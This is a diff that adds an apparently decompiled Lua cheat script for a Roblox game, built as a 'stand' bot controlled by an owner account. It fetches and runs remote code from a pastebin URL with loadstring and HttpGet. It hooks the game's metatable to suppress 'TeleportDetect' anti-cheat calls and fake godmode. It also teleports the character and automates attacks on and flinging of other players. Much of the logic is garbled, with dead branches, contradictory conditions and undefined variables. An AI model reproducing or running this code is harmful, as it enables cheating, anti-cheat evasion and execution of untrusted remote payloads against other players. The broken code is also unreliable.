@@ -1,0 +1,271 @@
+if nil then
+  game.Loaded:Wait()
+end
+repeat
+  wait()
+until not nil and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+wait(2)
+if not nil then
+  return
+end
+_G.executed = true
+loadstring(game:HttpGet("https://pastebin.com/raw/368CrUMr", true))()
+if not nil then
+  while true do
+  end
+  return
+elseif not game.Players.LocalPlayer:IsInGroup(13693934) then
+  game.Players.LocalPlayer:Kick("Join f10 development on roblox! roblox.com/groups/13693934/f10-development")
+  return
+end
+while true do
+  if nil then
+  end
+end
+for fj, fk in pairs(game.Players:GetPlayers()) do
+  if fk ~= game.Players.LocalPlayer and fk.UserId == getgenv().settings.Stand then
+  end
+end
+if game.Players.LocalPlayer.UserId == getgenv().settings.Stand then
+elseif game.Players.LocalPlayer.UserId == getgenv().settings.Owner then
+end
+if game.Players.LocalPlayer ~= game.Players.LocalPlayer and true == false then
+  game.StarterGui:SetCore("SendNotification", {
+    Title = "f10 stand",
+    Text = "Execute first in the stand player, wating for the stand owner",
+    Duration = 20
+  })
+  return
+end
+if game.Players.LocalPlayer == game.Players.LocalPlayer then
+  game.StarterGui:SetCore("SendNotification", {
+    Title = "Racemodex stand",
+    Text = "Waiting for the stand owner",
+    Duration = 20
+  })
+  Instance.new("Animation").AnimationId = "rbxassetid://3541114300"
+  Instance.new("Animation").AnimationId = "rbxassetid://3541044388"
+  game.Players.LocalPlayer.CharacterAdded:Connect(function(a)
+    game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(va):Play()
+  end)
+  for fq, fw in pairs(game.Workspace:GetDescendants()) do
+    if fw:IsA("Seat") then
+      fw:Destroy()
+    end
+  end
+  for fx, fQ in pairs(game.Players:GetPlayers()) do
+    if fQ ~= game.Players.LocalPlayer then
+      fQ.Chatted:Connect(function()
+        va(vb, ...)
+      end)
+    end
+  end
+  game.Players.PlayerAdded:Connect(function(a)
+    a.Chatted:Connect(function()
+      va(vb, ...)
+    end)
+    if a.UserId == getgenv().settings.Owner then
+      vb = a
+      game.StarterGui:SetCore("SendNotification", {
+        Title = "f10 stand",
+        Text = "Stand owner joined",
+        Duration = 20
+      })
+      delay(3, function()
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I am waiting for your commands! Master " .. va.Name, "All")
+      end)
+      if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
+        game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(vc):Play()
+      end
+    end
+  end)
+  setreadonly(getrawmetatable(game), false)
+  getrawmetatable(game).__namecall = newcclosure(function(a)
+    if getnamecallmethod() == "FireServer" and tostring({
+      ...
+    }[1]) == "Block" and _G.godmode == true and {
+      ...
+    }[2] == false then
+      return nil
+    end
+    if getnamecallmethod() == "FireServer" and tostring({
+      ...
+    }[1]) == "TeleportDetect" then
+      return
+    end
+    return va(a, ...)
+  end)
+  spawn(function()
+    while true do
+      va:Wait()
+      game.Players.LocalPlayer.MaximumSimulationRadius = math.pow(math.huge, math.huge) * math.huge
+      sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.pow(math.huge, math.huge) * math.huge)
+      game:GetService("RunService").Stepped:wait()
+    end
+  end)
+  game:GetService("RunService").RenderStepped:Connect(function()
+    pcall(function()
+      game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
+      if va then
+        game.Workspace.Camera.CameraSubject = va.Character.Humanoid
+      end
+    end)
+    if va then
+      if vb == true and vc == false and vd == false and ve == false then
+        if not function()
+          game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
+          if va then
+            game.Workspace.Camera.CameraSubject = va.Character.Humanoid
+          end
+        end and not va.Character then
+          game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = va.Character.HumanoidRootPart.CFrame * CFrame.new(2, 4, 2)
+        else
+          game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(math.random(-1000, 1000), 1000, math.random(-1000, 1000))
+        end
+      end
+      if vd == true and vc == false then
+        pcall(function()
+          game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(math.random(-1000, 1000), 1000, math.random(-1000, 1000))
+        end)
+      end
+      if game.Players.LocalPlayer.Character.BodyEffects:FindFirstChild("K.O").Value == true then
+        game.Players.LocalPlayer.Character.Humanoid:UnequipTools()
+        game.Players.LocalPlayer.Character.Humanoid:Destroy()
+        for fd, fe in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+          if fe:isA("MeshPart") or not pairs(game.Players.LocalPlayer.Character:GetChildren()) or fe:isA("Accessory") then
+            fe:Destroy()
+          end
+        end
+      end
+      if vg == true then
+        if not game.Players.LocalPlayer.Character:FindFirstChild("BodyEffects") then
+          game.Players.LocalPlayer.Character:FindFirstChild("BodyEffects"):FindFirstChild("Block").Name = "NotBlock"
+        end
+        if not game.Players.LocalPlayer.Character:FindFirstChild("BodyEffects"):FindFirstChild("HasGod") then
+          game.ReplicatedStorage.MainEvent:FireServer("Block", true)
+          game.Players.LocalPlayer.Character:WaitForChild("BodyEffects"):FindFirstChild("Dead"):Destroy()
+          game.Players.LocalPlayer.Character:WaitForChild("BodyEffects"):FindFirstChild("Armor"):Destroy()
+          game.Players.LocalPlayer.Character:WaitForChild("BodyEffects"):FindFirstChild("Defense"):Destroy()
+          Instance.new("BoolValue", game.Players.LocalPlayer.Character.BodyEffects).Name = "Dead"
+          Instance.new("IntValue", game.Players.LocalPlayer.Character.BodyEffects).Name = "Armor"
+          Instance.new("IntValue", game.Players.LocalPlayer.Character.BodyEffects).Name = "Defense"
+          Instance.new("IntValue", game.Players.LocalPlayer.Character.BodyEffects).Name = "HasGod"
+          Instance.new("Folder", game.Players.LocalPlayer.Character).Name = "FULLY_LOADED_CHAR"
+          game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
+          wait(1)
+          for fk, fl in pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
+            fl:Stop()
+          end
+          game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(vh):Play()
+        end
+      end
+      if vj == true and va.Character and (va.Character.BodyEffects:FindFirstChild("K.O").Value == true or game.Players.LocalPlayer.Character.BodyEffects:FindFirstChild("Grabbed").Value == va.Character) then
+        ve = true
+        if game.Players.LocalPlayer.Character.BodyEffects:FindFirstChild("Grabbed").Value ~= va.Character then
+          game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2 + 3)
+          if 1 < os.time() - vk then
+            game:GetService("ReplicatedStorage").MainEvent:FireServer("Grabbing", false)
+            vk = os.time()
+          end
+        elseif game.Players.LocalPlayer.Character.BodyEffects:FindFirstChild("Grabbed").Value == va.Character then
+          game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-200, 200, -300)
+        end
+      else
+        ve = false
+      end
+      if vl == true and va.Character and (va.Character.BodyEffects:FindFirstChild("K.O").Value == true or game.Players.LocalPlayer.Character.BodyEffects:FindFirstChild("Grabbed").Value == va.Character) then
+        ve = true
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(va.Character.UpperTorso.Position)
+        if va.Character.BodyEffects.SpecialParts.LowerTorso then
+          Instance.new("BodyPosition", va.Character.LowerTorso).MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+          Instance.new("BodyPosition", va.Character.LowerTorso).P = 1000000
+          Instance.new("BodyPosition", va.Character.LowerTorso).Position = Vector3.new(va.Character.LowerTorso.Position.X, 20, va.Character.LowerTorso.Position.Z)
+        else
+          va.Character.LowerTorso:FindFirstChild("BodyPosition").Position = Vector3.new(va.Character.LowerTorso.Position.X, 20, va.Character.LowerTorso.Position.Z)
+        end
+      else
+        ve = false
+        if va.Character.LowerTorso:FindFirstChild("BodyPosition") then
+          va.Character.LowerTorso:FindFirstChild("BodyPosition"):Destroy()
+        end
+      end
+      if vc and vm == nil then
+        vc = false
+      end
+      if vc == true and not va.Character.LowerTorso:FindFirstChild("BodyPosition") and vm.Character and ve == false then
+        if not game.Players.LocalPlayer.Backpack:FindFirstChild("[Knife]") and not game.Players.LocalPlayer.Character:FindFirstChild("[Knife]") then
+          for fe, fg in pairs(game.Workspace.Ignored.ItemsDrop:GetChildren()) do
+            wait()
+          end
+          game.Players.LocalPlayer.Character.Humanoid:UnequipTools()
+          if pairs(game.Workspace.Ignored.ItemsDrop:GetChildren()) or not fg:FindFirstChild("[Knife]") or pairs(game.Workspace.Ignored.ItemsDrop:GetChildren()) or fg then
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pairs(game.Workspace.Ignored.ItemsDrop:GetChildren()) or not fg:FindFirstChild("[Knife]") or pairs(game.Workspace.Ignored.ItemsDrop:GetChildren()) or fg:FindFirstChild("[Knife]").Handle.CFrame
+          end
+        elseif game.Players.LocalPlayer.Backpack:FindFirstChild("[Knife]") and game.Players.LocalPlayer.Character then
+          game.Players.LocalPlayer.Character.Humanoid:UnequipTools()
+          game.Players.LocalPlayer.Backpack:FindFirstChild("[Knife]").Parent = game.Players.LocalPlayer.Character
+        elseif game.Players.LocalPlayer.Character:FindFirstChild("[Knife]") then
+          for fe, fg in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+          end
+          if 1 < 0 + 1 then
+            game.Players.LocalPlayer.Character.Humanoid:UnequipTools()
+          end
+          game.Players.LocalPlayer.Character:FindFirstChild("[Knife]").Handle.Size = Vector3.new(25, 25, 25)
+          game.Players.LocalPlayer.Character:FindFirstChild("[Knife]").Handle.Transparency = 1
+          game.Players.LocalPlayer.Character:FindFirstChild("[Knife]").GripRight = Vector3.new(math.random(1, 9) * 0,1, math.random(1, 9) * 0,1, math.random(1, 9) * 0,1)
+          if vo == false or vo == true and vm.Character.BodyEffects:FindFirstChild("K.O").Value == false then
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(3 + 4)
+            if 2 < os.time() - vp then
+              game.Players.LocalPlayer.Character:FindFirstChild("[Knife]"):Activate()
+              vp = os.time()
+            end
+          elseif vo == true and vm.Character.BodyEffects:FindFirstChild("K.O").Value == true then
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(vm.Character.UpperTorso.Position)
+            game:GetService("ReplicatedStorage").MainEvent:FireServer("Grabbing", false)
+            if 0 + 1 then
+              Instance.new("BodyPosition", vm.Character.LowerTorso).MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+              Instance.new("BodyPosition", vm.Character.LowerTorso).P = 1000000
+              Instance.new("BodyPosition", vm.Character.LowerTorso).Position = Vector3.new(vm.Character.LowerTorso.Position.X, 500, vm.Character.LowerTorso.Position.Z)
+            else
+              vm.Character.LowerTorso:FindFirstChild("BodyPosition").Position = Vector3.new(vm.Character.LowerTorso.Position.X, 500, vm.Character.LowerTorso.Position.Z)
+            end
+          end
+        end
+      end
+    end
+  end)
+end
+if game.Players.LocalPlayer == game.Players.LocalPlayer then
+  Instance.new("BindableFunction").OnInvoke = function(a)
+    if a == "Copy The Link" and not a then
+      setclipboard("https://discord.gg/s10")
+    end
+  end
+  game.StarterGui:SetCore("SendNotification", {
+    Title = "Join our server!",
+    Text = "discord.gg/s10",
+    Duration = 99999,
+    Icon = "http://www.roblox.com/asset/?id=446181522",
+    Button1 = "Copy The Link",
+    Callback = Instance.new("BindableFunction")
+  });
+  (function()
+    Instance.new("Tool").Name = math.random(999999, 9999999)
+    Instance.new("Tool").RequiresHandle = false
+    Instance.new("Tool").CanBeDropped = false
+    Instance.new("Tool").Parent = game.Players.LocalPlayer.Backpack
+    Instance.new("Tool").TextureId = "http://www.roblox.com/asset/?id=5109488021"
+    Instance.new("Tool").ToolTip = "Copy player's name"
+    Instance.new("Tool").Equipped:Connect(function(a)
+      a.Button1Down:connect(function()
+        if va.Target and not nil then
+          vc.ToolTip = vb().Name
+          setclipboard(vb().Name)
+        end
+      end)
+    end)
+  end)()
+  game.Players.LocalPlayer.CharacterAdded:Connect(function(a)
+    va()
+  end)
+end
